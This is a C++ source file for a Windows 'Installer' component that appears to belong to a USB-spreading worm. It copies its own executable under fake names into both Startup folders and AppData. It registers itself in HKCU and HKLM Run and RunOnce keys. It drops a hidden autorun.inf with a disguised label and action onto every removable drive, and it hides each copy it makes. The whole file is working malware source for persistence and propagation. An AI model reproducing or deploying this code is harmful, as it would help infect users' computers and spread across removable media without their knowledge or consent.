#include "stdafx.h"
#include "Installer.h"
#include "Logger.h"
#include "Settings.h"
#include "Util.h"

Installer installer;

Installer::Installer()
{
	GetModuleFileName(NULL, exeName, MAX_PATH);


	TCHAR *appData;
	size_t appDataSize;
	_tdupenv_s(&appData, &appDataSize, _T("APPDATA"));

	appDataPath[0] = '\0';
	_tcscat_s(appDataPath, appData);
	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") V_FAKE_NAME1);

	registryPath[0] = '\0';
	_tcscat_s(registryPath, appData);
	_tcscat_s(registryPath, _T("\\") V_FAKE_NAME2);

	free(appData);

	startupPath[0] = '\0';
	_tcscat_s(startupPath, _T("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") V_FAKE_NAME3);


	const TCHAR* autorunStrU =
		_T("[autorun]\r\n")
		_T("label=")  V_FAKE_USB_LABEL  _T("\r\n")
		_T("action=") V_FAKE_USB_ACTION _T("\r\n")
		_T("open=")   V_FAKE_USB_FILE   _T("\r\n")
		_T("icon=")   V_FAKE_USB_FILE   _T(",0");
	const std::string autorunStrCpp = Util::t2s(autorunStrU);

	autorunBytes = autorunStrCpp.size();
	memcpy(autorunData, autorunStrCpp.c_str(), autorunBytes);

}
Installer::~Installer()
{

}

bool Installer::SetAutorun(bool autorun)
{
	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun) | SetAutorunStartup(autorun);
}

bool Installer::InstallOnDrives()
{
	TCHAR drive[_MAX_PATH] = _T(" :\\");

	for (TCHAR c = 'A'; c <= 'Z'; c++) {
		drive[0] = c;

		this->InstallOnDrive(drive);
	}
	return true;
}
bool Installer::InstallOnDrive(const TCHAR* drive)
{
	TCHAR target[_MAX_PATH] = {0};

	if (GetDriveType(drive) != DRIVE_REMOVABLE) {
		return false;
	}

	if (!(PathAppend(target, drive) && PathAppend(target, V_FAKE_USB_FILE))) {
		return false;
	}

	if (!this->CopyTo(target)) {
		return false;
	}

	target[0] = '\0';
	if (!(PathAppend(target, drive) && PathAppend(target, _T("autorun.inf")))) {
		return false;
	}

	HANDLE hFile = CreateFile(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	DWORD written;
	bool ret = TRUE == WriteFile(hFile, autorunData, autorunBytes, &written, NULL);
	VLog(LMESSAGE, target);

	CloseHandle(hFile);
	return ret;
}

bool Installer::CopyTo(const TCHAR* path)
{
	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
	{
		return true;
	}
	else if (CopyFile(exeName, path, FALSE))
	{
		this->HideFile(path);
		return true;
	}
	else
	{
		VLog(LNOTICE, "Failed to copy file");
		return false;
	}
}
bool Installer::HideFile(const TCHAR* path)
{
	return TRUE == SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}
bool Installer::SetAutorunAppdata(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(appDataPath);
	}
	else
	{
		return DeleteFile(appDataPath) != 0;
	}
}
bool Installer::SetAutorunStartup(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(startupPath);
	}
	else
	{
		return DeleteFile(startupPath) != 0;
	}
}
bool Installer::SetAutorunRegistry(bool autorun)
{
	bool ret = false;

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));

	return ret;
}

bool Installer::SetAutorunRegistryWithKey(bool autorun, HKEY key, const TCHAR* subkey) {
	HKEY hKey;

	if (RegCreateKeyEx(key, subkey,
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)
		!= ERROR_SUCCESS)
	{
		return false;
	}

	bool ret = false;

	if (autorun)
	{
		if (!this->CopyTo(registryPath))
		{
			goto g_end;
		}

		if (RegSetValueEx(hKey, V_FAKE_NAME2, 0, REG_SZ,
			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(TCHAR))
			!= ERROR_SUCCESS)
		{
			goto g_end;
		}
	}
	else
	{
		RegDeleteValue(hKey, V_FAKE_NAME2);

		if (!DeleteFile(registryPath))
		{
			goto g_end;
		}
	}

	ret = true;
g_end:
	RegCloseKey(hKey);
	return ret;
}